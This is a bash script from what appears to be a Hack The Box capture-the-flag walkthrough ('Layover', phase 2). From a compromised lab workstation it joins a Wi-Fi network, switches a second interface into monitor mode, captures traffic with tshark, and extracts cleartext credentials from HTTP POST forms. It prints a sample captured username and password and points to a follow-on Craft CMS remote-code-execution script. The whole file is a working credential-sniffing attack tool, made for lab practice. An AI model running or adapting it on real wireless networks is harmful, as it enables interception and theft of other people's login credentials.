#!/usr/bin/env bash
# HTB Layover - Phase 2: wireless pivot + cleartext credential capture.
# Run this INSIDE the RDP session on airside-ws01 (as contractor with sudo).
#
# Usage: ./02_wifi_sniff.sh [SSID] [CONNECT_IFACE] [MON_IFACE] [CHANNEL] [PCAP]
set -uo pipefail

SSID="${1:-HTB International WiFi}"
CONIF="${2:-wlan2}"
MONIF="${3:-wlan3}"
CHAN="${4:-6}"
PCAP="${5:-/tmp/wifi.pcap}"

echo "=============================================="
echo "  Layover - WiFi sniff"
echo "  SSID=$SSID  connect=$CONIF  monitor=$MONIF  ch=$CHAN"
echo "=============================================="

echo
echo "[*] interfaces:"
iwconfig 2>/dev/null | grep -E '^[a-z]' || true
ip -brief addr || true

echo
echo "[*] available networks:"
sudo nmcli device wifi list || true

echo
echo "[*] joining '$SSID' on $CONIF ..."
sudo nmcli device wifi connect "$SSID" ifname "$CONIF" || {
  echo "!! association failed - check the SSID name from the scan above"; }
ip -brief addr show "$CONIF"
echo "    (expect an address on 10.13.37.0/24 - that is the internal segment)"

echo
echo "[*] putting $MONIF into monitor mode on channel $CHAN ..."
sudo nmcli device set "$MONIF" managed no 2>/dev/null || true
sudo ip link set "$MONIF" down
sudo iw dev "$MONIF" set type monitor
sudo ip link set "$MONIF" up
sudo iw dev "$MONIF" set channel "$CHAN"

echo
echo "[*] capturing to $PCAP for 180s (Ctrl-C to stop early)..."
echo "    a scripted employee logs into the captive portal over plain HTTP;"
echo "    we only need that one POST."
sudo timeout 180 tshark -i "$MONIF" -w "$PCAP" 2>/dev/null || true

echo
echo "================= CLEARTEXT CREDENTIALS ================="
sudo tshark -r "$PCAP" \
  -Y 'http.request.method=="POST"' \
  -T fields -e ip.src -e http.host -e http.request.uri \
  -e urlencoded-form.key -e urlencoded-form.value 2>/dev/null | grep -a . || {
    echo "(nothing yet - capture longer: sudo tshark -i $MONIF -w $PCAP)"; }

echo "========================================================="
echo "Expected:  <ip>  portal.international.htb  /miles/login.php  username,password  jenny,Fl1ghtDeck2026!"
echo
echo "Next: Craft CMS RCE on http://portal.international.htb  (see 03_craft_rce.py)"
